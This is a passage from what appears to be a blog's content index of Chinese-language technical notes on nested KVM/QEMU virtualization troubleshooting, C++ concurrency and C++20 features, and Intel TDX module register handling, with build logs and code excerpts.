class=\"line\">Entering rescue mode...</span><br><span class=\"line\">grub rescue&gt;</span><br></pre></td></tr></table></figure>\n\n<p>镜像有问题，换镜像就好了</p>\n<h2 id=\"hostVM编译内核\"><a href=\"#hostVM编译内核\" class=\"headerlink\" title=\"hostVM编译内核\"></a>hostVM编译内核</h2><p>整体编译：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/objtool/include/objtool/elf.h:10:10: fatal error: gelf.h: No such fy</span><br><span class=\"line\">   10 | #include &lt;gelf.h&gt;</span><br><span class=\"line\">      |          ^~~~~~~~</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[3]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[2]: *** [Makefile:56: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/objtool/objtool-in.o] Error 2</span><br><span class=\"line\">make[1]: *** [Makefile:69: objtool] Error 2</span><br><span class=\"line\">make: *** [Makefile:1417: tools/objtool] Error 2</span><br><span class=\"line\">make: *** Waiting for unfinished jobs....</span><br><span class=\"line\">make[4]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[4]: *** Waiting for unfinished jobs....</span><br><span class=\"line\">  CC      /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids/libbpf/staticobjs/ringbuf.o</span><br><span class=\"line\">libbpf.c:47:10: fatal error: libelf.h: No such file or directory</span><br><span class=\"line\">   47 | #include &lt;libelf.h&gt;</span><br><span class=\"line\">      |          ^~~~~~~~~~</span><br><span class=\"line\">compilation terminated.</span><br><span class=\"line\">make[4]: *** [/usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/build/Makefile.build:97: /usr/src/linux-source-5.15.01</span><br><span class=\"line\">make[3]: *** [Makefile:158: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids/libbpf/staticobjs/li2</span><br><span class=\"line\">make[2]: *** [Makefile:48: /usr/src/linux-source-5.15.0/linux-source-5.15.0/tools/bpf/resolve_btfids//libbpf/libbpf.a] Err2</span><br><span class=\"line\">make[1]: *** [Makefile:72: bpf/resolve_btfids] Error 2</span><br><span class=\"line\">make: *** [Makefile:1417: tools/bpf/resolve_btfids] Error 2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://blog.csdn.net/qq_42000667/article/details/125205105\">fatal error: libelf.h: No such file or directory 解决方案_正义之兔的博客-CSDN博客</a></p>\n<p>之后编译会报更多的错</p>\n<p>解决方案：</p>\n<p>不在VM里面编译，在host上编译</p>\n<p>换了一台电脑 出现找不到某个.so</p>\n<p>解决方案：</p>\n<p><code>sudo ln -s /snap/core20/1974/usr/lib/x86_64-linux-gpu/libcrypto.so.1.1 /usr/lib/libcrypto.so.1.1</code></p>\n<h2 id=\"host用自定义内核启动hostVM\"><a href=\"#host用自定义内核启动hostVM\" class=\"headerlink\" title=\"host用自定义内核启动hostVM\"></a>host用自定义内核启动hostVM</h2><p>内核启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VFS: Cannot open root device &quot;vda1&quot; or unknown-block(0,0): error -6</span><br><span class=\"line\">[    0.485922] Please append a correct &quot;root=&quot; boot option; here are the available partitions:</span><br><span class=\"line\">[    0.486970] 0b00         1048575 sr0</span><br><span class=\"line\">[    0.486971]  driver: sr</span><br><span class=\"line\">[    0.487755] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br><span class=\"line\">[    0.488791] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.15.18 #3</span><br><span class=\"line\">[    0.489541] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.0-59-gc9ba5276e321-prebuilt.qemu.org 044</span><br><span class=\"line\">[    0.490981] Call Trace:</span><br><span class=\"line\">[    0.491304]  dump_stack+0x6d/0x8b</span><br><span class=\"line\">[    0.491730]  panic+0xf7/0x25a</span><br><span class=\"line\">[    0.492111]  mount_block_root+0x1f6/0x2da</span><br><span class=\"line\">[    0.492623]  ? set_debug_rodata+0x34/0x34</span><br><span class=\"line\">[    0.493134]  mount_root+0x38/0x3a</span><br><span class=\"line\">[    0.493560]  prepare_namespace+0x139/0x18e</span><br><span class=\"line\">[    0.494087]  kernel_init_freeable+0x22c/0x259</span><br><span class=\"line\">[    0.494640]  ? rest_init+0xb0/0xb0</span><br><span class=\"line\">[    0.495075]  kernel_init+0xe/0x110</span><br><span class=\"line\">[    0.495507]  ret_from_fork+0x35/0x40</span><br><span class=\"line\">[    0.495981] Kernel Offset: 0x1c400000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)</span><br><span class=\"line\">[    0.497305] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)</span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p>不用host的config，用<code>make defconfig</code></p>\n<h2 id=\"hostVM使用kvm模块\"><a href=\"#hostVM使用kvm模块\" class=\"headerlink\" title=\"hostVM使用kvm模块\"></a>hostVM使用kvm模块</h2><p>没有内核模块kvm 手动复制进去加载会报格式错误</p>\n<p><code>/lib/modules</code>只有原来的版本 和新的内核版本对不上</p>\n<p>解决方案：</p>\n<p>config加入<code>CONFIG_KVM=y</code>及<code>CONFIG_KVM_INTEL=y</code></p>\n<h2 id=\"hostVM使用virtio-balloon模块\"><a href=\"#hostVM使用virtio-balloon模块\" class=\"headerlink\" title=\"hostVM使用virtio-balloon模块\"></a>hostVM使用virtio-balloon模块</h2><p><code>CONFIG_VIRTIO_BALLOON=m</code> 传入hostVM insmod加载 lsmod查看</p>\n<p>实际上可以用y直接编译进内核 即使lsmod看不见也是可用的</p>\n<p>qemu加入启动参数 这样qemu monitor有balloon相关命令 但是可能失效</p>\n<p>guest中balloon加载mod后会瞬间起效</p>\n<h2 id=\"guestVM内存超过hostVM\"><a href=\"#guestVM内存超过hostVM\" class=\"headerlink\" title=\"guestVM内存超过hostVM\"></a>guestVM内存超过hostVM</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ubuntu@jammy:~$ ./boot.sh</span><br><span class=\"line\">[   37.106705] __vm_enough_memory: pid: 472, comm: qemu-system-x86, not enough memory for the allocation</span><br><span class=\"line\">qemu-system-x86_64: cannot set up guest memory &#x27;pc.ram&#x27;: Cannot allocate memory</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>解决方案：</p>\n<p><a href=\"https://www.cnblogs.com/ruiy/p/11607036.html\">openstack kvm cannot set up guest memory ‘pc.ram’: Cannot allocate memory - 秦瑞It行程实录 - 博客园 (cnblogs.com)</a></p>\n<p><code> sudo bash -c &quot;echo 1 &gt; /proc/sys/vm/overcommit_memory&quot;</code></p>\n<h2 id=\"hostVM-用perf\"><a href=\"#hostVM-用perf\" class=\"headerlink\" title=\"hostVM 用perf\"></a>hostVM 用perf</h2><p>需要在host上编译hostVM image的source里面 编译perf</p>\n<p>如果编译报错 不是代码的问题 是依赖的问题 可能少了很多依赖没装 少哪个装哪个 最后少了pkg-config</p>\n<p>hostVM 用apt装 libbabeltrace-ctf-dev 等 也可以直接复制.so</p>\n<p>config加入<code>CONFIG_BPF_SYSCALL=y</code></p>\n<p>record后面必须加<code>-e cpu-clock</code> 否则会每次写入0.002M 无sample 和宿主机行为不一样</p>\n<p>火焰图下的FlameGraph脚本需要sudo</p>\n<h2 id=\"perf看不到kernel-symbol\"><a href=\"#perf看不到kernel-symbol\" class=\"headerlink\" title=\"perf看不到kernel symbol\"></a>perf看不到kernel symbol</h2><p>用-p pid可看到报错提示</p>\n<p>根据提示<code>sudo bash -c &quot;echo -1 &gt; /proc/sys/kernel/perf_event_paranoid&quot;</code></p>\n<p>值是2 disallow kernel profiling</p>\n<h2 id=\"guest-perf\"><a href=\"#guest-perf\" class=\"headerlink\" title=\"guest perf\"></a>guest perf</h2><p>tools目录 <code>make LDFLAGS=-static perf</code> ldd perf看到not a dynamic executable</p>\n<h2 id=\"VM增大磁盘容量\"><a href=\"#VM增大磁盘容量\" class=\"headerlink\" title=\"VM增大磁盘容量\"></a>VM增大磁盘容量</h2><p>先qemu-img resize</p>\n<p>然后进虚拟机 fdisk -l 看设备</p>\n<p>然后fdisk 设备  删分区 加分区  </p>\n<p><a href=\"https://taoshu.in/unix/resize-qemu-ext4.html#google_vignette\">https://taoshu.in/unix/resize-qemu-ext4.html#google_vignette</a></p>\n<h2 id=\"hostVM网络工具\"><a href=\"#hostVM网络工具\" class=\"headerlink\" title=\"hostVM网络工具\"></a>hostVM网络工具</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ubuntu@jammy:~$ make network</span><br><span class=\"line\">sudo brctl addbr br0</span><br><span class=\"line\">add bridge failed: Package not installed</span><br><span class=\"line\">make: *** [Makefile:2: network] Error 1</span><br></pre></td></tr></table></figure>\n\n<p>config加入<code>CONFIG_BRIDGE=y</code> <code>CONFIG_TUN=y</code> <code>CONFIG_TAP=y</code></p>\n<p>必须是y 不能是m</p>\n<p>guestVM启动分配的mac地址必须不可以和hostVM一样</p>\n<h2 id=\"ssh连接hostVM\"><a href=\"#ssh连接hostVM\" class=\"headerlink\" title=\"ssh连接hostVM\"></a>ssh连接hostVM</h2><p>默认优先级是从外至内的</p>\n<p>guestVM ctrl a x会退出两个 用ssh不会</p>\n<p><a href=\"https://blog.csdn.net/yjk13703623757/article/details/114936739\">解决Permission denied (publickey)._Locutus的博客-CSDN博客</a></p>\n<h2 id=\"soc-term\"><a href=\"#soc-term\" class=\"headerlink\" title=\"soc term\"></a>soc term</h2><p>如果不能配网络的情况下 用这个</p>\n<p><a href=\"https://review.trustedfirmware.org/plugins/gitiles/OP-TEE/build/+/c79ecf72671f50cf8768514245bce5e46cfe4fa5/soc_term.py\">soc_term.py - OP-TEE&#x2F;build - Gitiles (trustedfirmware.org)</a></p>\n<h2 id=\"挂载文件\"><a href=\"#挂载文件\" class=\"headerlink\" title=\"挂载文件\"></a>挂载文件</h2><p>用virtfs </p>\n<p><code>sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/shared</code></p>\n<h2 id=\"gdb-调内核\"><a href=\"#gdb-调内核\" class=\"headerlink\" title=\"gdb 调内核\"></a>gdb 调内核</h2><p>内核编译打开debug info</p>\n<p>内核目录下 <code>gdb vmlinux</code> 然后<code>target remote localhost:1234</code></p>\n<p>可以用hb代替b 可以启动完成后ctrl c 然后b 然后c</p>\n<p>启动加<code>-S -gdb tcp::1234</code></p>\n<p>需要加<code>-append &quot;nokaslr&quot;</code> 否则断点打了不会停</p>\n<h2 id=\"balloon\"><a href=\"#balloon\" class=\"headerlink\" title=\"balloon\"></a>balloon</h2><p><a href=\"http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html\">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>\n<h2 id=\"final\"><a href=\"#final\" class=\"headerlink\" title=\"final\"></a>final</h2><p>修改host上的<code>linux_stable</code> 使用defconfig并加入kvm的配置</p>\n<p>-kernel启动hostVM后把bzImage复制（scp）进hostVM，hostVM用同样的image启动guestVM</p>\n<p>hostVM ubuntu password 创建后先配置网络 然后host上用ssh连hostVM</p>\n<p>guestVM ubuntu 123</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">net:</span></span><br><span class=\"line\">        sudo brctl addbr br0</span><br><span class=\"line\">        sudo ip addr flush dev ens4</span><br><span class=\"line\">        sudo brctl addif br0 ens4</span><br><span class=\"line\">        sudo tunctl -t tap0 -u ubuntu</span><br><span class=\"line\">        sudo brctl addif br0 tap0</span><br><span class=\"line\">        sudo ifconfig ens4 up</span><br><span class=\"line\">        sudo ifconfig tap0 up</span><br><span class=\"line\">        sudo ifconfig br0 up</span><br><span class=\"line\">        sudo dhclient br0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">mem:</span></span><br><span class=\"line\">        sudo bash -c <span class=\"string\">&quot;echo 1 &gt; /proc/sys/vm/overcommit_memory&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">swap:</span></span><br><span class=\"line\">        sudo swapon test_swap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">watchmsg:</span></span><br><span class=\"line\">        watch <span class=\"string\">&quot;dmesg | tail -n 20&quot;</span></span><br><span class=\"line\"><span class=\"section\">watchfree:</span></span><br><span class=\"line\">        watch <span class=\"string\">&quot;free -mh&quot;</span></span><br><span class=\"line\"><span class=\"section\">init:</span></span><br><span class=\"line\">        make net</span><br><span class=\"line\">        make mem</span><br><span class=\"line\">        make swap</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["virtualization"]},{"title":"C++ Concurrency in Action","url":"/2026/01/31/cpp/c++%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/","content":"<h1 id=\"C-Concurrency-in-Action\"><a href=\"#C-Concurrency-in-Action\" class=\"headerlink\" title=\"C++ Concurrency in Action\"></a>C++ Concurrency in Action</h1><h2 id=\"Managing-threads\"><a href=\"#Managing-threads\" class=\"headerlink\" title=\"Managing threads\"></a>Managing threads</h2><ol>\n<li><p><code>std::thread</code> 创建对象就会直接开始新线程。有默认构造函数 不会和任意线程绑定 需要通过move接受别的</p>\n</li>\n<li><p>必须使用join或者detach。 使用detach可成为守护线程，生命周期和程序一样长；为了避免exception导致没有join可以使用一个类，析构里join</p>\n<p><code>std::for_each(threads.begin(),threads.end(),std::mem_fn(&amp;std::thread::join))</code></p>\n</li>\n<li><p><code>std::thread</code>默认copy参数，即使函数使用引用，如果要用引用需要手动加<code>std::ref</code></p>\n</li>\n<li><p>如果给的参数是创建线程的函数的临时变量，函数结束变量销毁可能导致线程的指针问题</p>\n</li>\n<li><p>如果需要用类的函数，语法为<code>std::thread(&amp;Object::f,&amp;object,a,b,c)</code> 类似<code>std::bind</code></p>\n</li>\n<li><p><code>std::thread</code>可以move不能copy 类似<code>std::ifstream</code> <code>std::unique_ptr</code></p>\n<p>通过move转义控制权到另一个<code>std::thread</code>对象</p>\n<p>当出现临时的<code>std::thread</code>对象时会隐式move</p>\n<p>可以放在<code>std::vector</code>中</p>\n</li>\n<li><p><code>std::this_thread::get_id()</code>拿到<code>std::thread::id</code> 支持比较操作</p>\n</li>\n<li><p><code>std::this_thread::yield()</code>不同于sleep等信号打断或睡眠固定时间，此操作让出time slice 供cpu调度</p>\n</li>\n</ol>\n<h2 id=\"Sharing-data-between-threads\"><a href=\"#Sharing-data-between-threads\" class=\"headerlink\" title=\"Sharing data between threads\"></a>Sharing data between threads</h2><ol start=\"9\">\n<li><p><code>std::mutex</code>有成员函数lock和unlock 但是不推荐使用 因为必须记得放锁</p>\n<p>最好配合lock_guard等离开作用域自动放锁的对象一起用</p>\n</li>\n<li><p><code>boost::shared_lock&lt;boost::shared_mutex&gt;</code>访问只读对象，此时互斥锁会等待</p>\n</li>\n<li><p><code>std::lock</code>同时锁多个 避免死锁</p>\n</li>\n</ol>\n<p><code>std::adopt_lock</code>作为参数不用等直接拿已经有的</p>\n<ol start=\"12\">\n<li><p>不一定只有锁才会导致死锁，join或者wait都会，在设计时需要留意</p>\n</li>\n<li><p>一些避免死锁的guidelines  hierarchi  try_lock</p>\n</li>\n<li><p><code>std::unique_lock</code>可以用<code>std::defer_lock</code>作为第二个参数，先不拿锁，之后手动lock</p>\n</li>\n<li><p>锁的范围应该最小</p>\n</li>\n</ol>\n<p><code>std::once_flag</code>配合<code>std::call_once</code>在任意多的线程中只执行一次，进行初始化的操作</p>\n<ol start=\"16\">\n<li>允许多个同时读，但不允许多个写或读写一起,c++不提供，可以使用boost</li>\n</ol>\n<p>   读：<code>boost::shared_lock&lt;boost::shared_mutex&gt;</code></p>\n<p>   写：<code>std::unique_lock&lt;boost::shared_mutex&gt;</code></p>\n<h2 id=\"Synchronizing-concurrent-operations\"><a href=\"#Synchronizing-concurrent-operations\" class=\"headerlink\" title=\"Synchronizing concurrent operations\"></a>Synchronizing concurrent operations</h2><ol start=\"17\">\n<li><p><code>std::condition_variable</code> </p>\n<p>wait 接受一个锁和一个lambda表达式作为参数 防止先notify再wait</p>\n<p>notify_one&#x2F;notify_all 唤醒wait等待的线程</p>\n</li>\n<li><p><code>std::async</code>用法和<code>std::thread</code>用法一样，但不是返回线程，而是返回<code>std::future&lt;T&gt;</code></p>\n<p>可以通过get方法拿到最后的返回值</p>\n<p>可以增加参数 不立即执行 （实际上是否开线程不确定）</p>\n</li>\n<li><p><code>std::package_task&lt;&gt;</code> 接受函数作为参数，可以在适当的时候通过（）直接调用</p>\n<p>get_future可以拿到future</p>\n<p>想开线程执行一个函数 拿到返回值 可以先构造task 然后拿到future task传给thread执行，最后从future中拿出数据</p>\n<p>返回类型可用<code>std::result_of&lt;&gt;</code></p>\n</li>\n<li><p><code>std::promise&lt;T&gt;</code>get_future拿到<code>std::future&lt;T&gt;</code></p>\n<p>可以通过set_value在线程间传递数据</p>\n</li>\n<li><p>cv和future都可以wait_for&#x2F;wait_until设置timeout</p>\n<p>返回<code>std::future_status</code> 可以判断timeout ready等状态</p>\n</li>\n</ol>\n<h2 id=\"The-C-memory-model-and-operations-on-atomic-types\"><a href=\"#The-C-memory-model-and-operations-on-atomic-types\" class=\"headerlink\" title=\"The C++ memory model and operations on atomic types\"></a>The C++ memory model and operations on atomic types</h2><ol start=\"22\">\n<li><p><code>std::atomic&lt;T&gt;</code> 原子类型 有load store exchange等原子操作</p>\n<p>is_lock_free判断是否需要锁保护</p>\n</li>\n<li><p>memory ordering 指定操作顺序 对于不同变量的操作可能是乱序的</p>\n</li>\n<li><p>通过原子操作可用不需要锁实现并发安全的数据结构</p>\n</li>\n</ol>\n","categories":["cpp"]},{"title":"C++20高级编程","url":"/2026/01/31/cpp/C++20%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/","content":"<h1 id=\"C-20高级编程\"><a href=\"#C-20高级编程\" class=\"headerlink\" title=\"C++20高级编程\"></a>C++20高级编程</h1><h2 id=\"类型与对象\"><a href=\"#类型与对象\" class=\"headerlink\" title=\"类型与对象\"></a>类型与对象</h2><ol>\n<li><pre><code class=\"c++\">template&lt;typename F,typename...Args&gt;\nusing result_of = decltype(std::declval&lt;F&gt;()(std::declval&lt;Args&gt;()...))\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2. `std::pair a&#123;1,2.3&#125;` 类模板自动推导</span><br><span class=\"line\"></span><br><span class=\"line\">3. 运行时多态 传统面向对象编程 subtype多态 用指针 虚函数</span><br><span class=\"line\"></span><br><span class=\"line\">   用`std::variant` `std::visit` ad-hoc多态 性能更高 </span><br><span class=\"line\"></span><br><span class=\"line\">   看不同设计模式的要求</span><br><span class=\"line\"></span><br><span class=\"line\">   ```c++</span><br><span class=\"line\">   struct Circle&#123;&#125;;</span><br><span class=\"line\">   struct Rectangle&#123;&#125;;</span><br><span class=\"line\">   double getArea(const Circle &amp;c);</span><br><span class=\"line\">   double getArea(const Rectangle &amp;r);</span><br><span class=\"line\">   using Shape = std::variant&lt;Circle,Rectangle&gt;;</span><br><span class=\"line\">   double getArea(const Shape &amp;s)&#123;</span><br><span class=\"line\">   \treturn std::visit(</span><br><span class=\"line\">   \t\t[](const auto&amp;data)&#123;</span><br><span class=\"line\">   \t\t\treturn getArea(data);</span><br><span class=\"line\">   \t\t&#125;,s</span><br><span class=\"line\">   \t)</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n<li><p>查看类型-</p>\n<ul>\n<li><code>[[deprecated]]</code>表示弃用，可以通过编译器的警告来看</li>\n<li>编译器提供的宏 <code>_PRETTY_FUNCTION_</code></li>\n<li><a href=\"https://cppinsights.io/\">https://cppinsights.io</a></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"编译时多态\"><a href=\"#编译时多态\" class=\"headerlink\" title=\"编译时多态\"></a>编译时多态</h2><ol start=\"5\">\n<li><p>函数:</p>\n<ul>\n<li>名称查找：ADL规则 不在作用域内的也可见</li>\n<li>模板函数处理：推导 SFINAE  替换失败不会导致编译错误 只是放弃这个选择</li>\n<li>重载决议：参数最匹配 转换最少；非模板优于模板</li>\n</ul>\n</li>\n<li><p>type traits：输入类型 输出特征 变换类型</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"type\">size_t</span> N&gt;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"type\">size_t</span> fibonacci = fibonacci&lt;N<span class=\"number\">-1</span>&gt; + fibonacci&lt;N<span class=\"number\">-2</span>&gt;;</span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;&gt;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"type\">size_t</span> fibonacci&lt;<span class=\"number\">0</span>&gt; = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;&gt;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"type\">size_t</span> fibonacci&lt;<span class=\"number\">1</span>&gt; = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">static_assert</span>(fibonacci&lt;<span class=\"number\">10</span>&gt; == <span class=\"number\">55</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>[[no_unique_address]]</code>空基类优化成0字节</p>\n</li>\n<li><p><code>condition_t&lt;true,int,float&gt;</code> int</p>\n</li>\n<li><p>类型内省 通过模板偏特化拿到数组长度 函数参数类型等信息</p>\n</li>\n<li><p><code>enable_if</code>或标签分发 可用<code>if constexpr</code> 代替</p>\n</li>\n<li><p>奇异递归模板：把派生类作为基类的模板参数，让基类可用使用派生类提供的方法</p>\n<p>可实现多态，避免虚函数开销</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> Derived&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Base</span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">f</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">static_cast</span>&lt;Derived&amp;&gt;(*<span class=\"keyword\">this</span>).<span class=\"built_in\">f_Impl</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Derived</span>: <span class=\"keyword\">public</span> Base&lt;Derived&gt;&#123;</span><br><span class=\"line\">    <span class=\"keyword\">friend</span> Base;<span class=\"comment\">//struct可以不用</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">f_Impl</span><span class=\"params\">()</span></span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>三路比较操作符<code>&lt;=&gt;</code> 默认强序 根据成员变量声明顺序比较</p>\n</li>\n<li><p><code>make_shared</code>比<code>new</code>效率高</p>\n</li>\n<li></li>\n</ol>\n","categories":["cpp"]},{"title":"TDX module","url":"/2026/02/03/virtualization/TDX%20module/","content":"<h1 id=\"TDX-module\"><a href=\"#TDX-module\" class=\"headerlink\" title=\"TDX module\"></a>TDX module</h1><p><a href=\"https://github.com/amd/AMD-ASPFW/blob/main/fw/psp_bl_uapps/sev_uapp/src/sev_dispatch.c\">https://github.com/amd/AMD-ASPFW/blob/main/fw/psp_bl_uapps&#x2F;sev_uapp&#x2F;src&#x2F;sev_dispatch.c</a></p>\n<h2 id=\"tdx\"><a href=\"#tdx\" class=\"headerlink\" title=\"tdx\"></a>tdx</h2><h3 id=\"tdcall\"><a href=\"#tdcall\" class=\"headerlink\" title=\"tdcall\"></a>tdcall</h3><p><a href=\"https://github.com/intel/tdx-module/blob/tdx_1.5/src/td_dispatcher/tdx_td_dispatcher.c\">https://github.com/intel/tdx-module/blob/tdx_1.5&#x2F;src&#x2F;td_dispatcher&#x2F;tdx_td_dispatcher.c</a></p>\n<p>rcx 是通用寄存器 bitmap 决定哪些寄存器会从 td 传到 vmm 避免被 tdx module 清零</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">noinstr u64 __tdx_hypercall(<span class=\"keyword\">struct</span> tdx_module_args *args)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * For TDVMCALL explicitly set RCX to the bitmap of shared registers.</span></span><br><span class=\"line\"><span class=\"comment\">         * The caller isn&#x27;t expected to set @args-&gt;rcx anyway.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        args-&gt;rcx = TDVMCALL_EXPOSE_REGS_MASK;</span><br><span class=\"line\">s</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Failure of __tdcall_saved_ret() indicates a failure of the TDVMCALL</span></span><br><span class=\"line\"><span class=\"comment\">         * mechanism itself and that something has gone horribly wrong with</span></span><br><span class=\"line\"><span class=\"comment\">         * the TDX module.  __tdx_hypercall_failed() never returns.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__tdcall_saved_ret(TDG_VP_VMCALL, args))</span><br><span class=\"line\">                __tdx_hypercall_failed();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* TDVMCALL leaf return code is in R10 */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> args-&gt;r10;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>tdx module 记录所有通用寄存器并清零</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.section .text</span><br><span class=\"line\">.globl tdx_tdexit_entry_point</span><br><span class=\"line\">.globl tdx_tdentry_to_td</span><br><span class=\"line\"></span><br><span class=\"line\">tdx_tdexit_entry_point:</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * Save all TD GPRs on module entry to LP local data</span><br><span class=\"line\">     * Local data is located at GSBASE</span><br><span class=\"line\">     */</span><br><span class=\"line\">    movq %rax,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET</span><br><span class=\"line\">    movq %rcx,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+8</span><br><span class=\"line\">    movq %rdx,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+16</span><br><span class=\"line\">    movq %rbx,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+24</span><br><span class=\"line\">    movq %rsp,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+32</span><br><span class=\"line\">    movq %rbp,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+40</span><br><span class=\"line\">    movq %rsi,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+48</span><br><span class=\"line\">    movq %rdi,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+56</span><br><span class=\"line\">    movq %r8,   %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+64</span><br><span class=\"line\">    movq %r9,   %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+72</span><br><span class=\"line\">    movq %r10,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+80</span><br><span class=\"line\">    movq %r11,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+88</span><br><span class=\"line\">    movq %r12,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+96</span><br><span class=\"line\">    movq %r13,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+104</span><br><span class=\"line\">    movq %r14,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+112</span><br><span class=\"line\">    movq %r15,  %gs:TDX_LOCAL_DATA_TD_GPRS_STATE_OFFSET+120</span><br><span class=\"line\"></span><br><span class=\"line\">        /*</span><br><span class=\"line\">         * clear TD GPRs on entry to the TDX module</span><br><span class=\"line\">         */</span><br><span class=\"line\">    xor %rax, %rax</span><br><span class=\"line\">    xor %rcx, %rcx</span><br><span class=\"line\">    xor %rdx, %rdx</span><br><span class=\"line\">    xor %rbx, %rbx</span><br><span class=\"line\">    xor %rbp, %rbp</span><br><span class=\"line\">    xor %rsi, %rsi</span><br><span class=\"line\">    xor %rdi, %rdi</span><br><span class=\"line\">    xor %r8, %r8</span><br><span class=\"line\">    xor %r9, %r9</span><br><span class=\"line\">    xor %r10, %r10</span><br><span class=\"line\">    xor %r11, %r11</span><br><span class=\"line\">    xor %r12, %r12</span><br><span class=\"line\">    xor %r13, %r13</span><br><span class=\"line\">    xor %r14, %r14</span><br><span class=\"line\">    xor %r15, %r15</span><br><span class=\"line\"></span><br><span class=\"line\">    // Protection against speculative attacks on GPRs</span><br><span class=\"line\">    lfence</span><br><span class=\"line\"></span><br><span class=\"line\">    // Choose which dispatcher we want to call based on current TD VM,</span><br><span class=\"line\">    // stored in local data before the TD 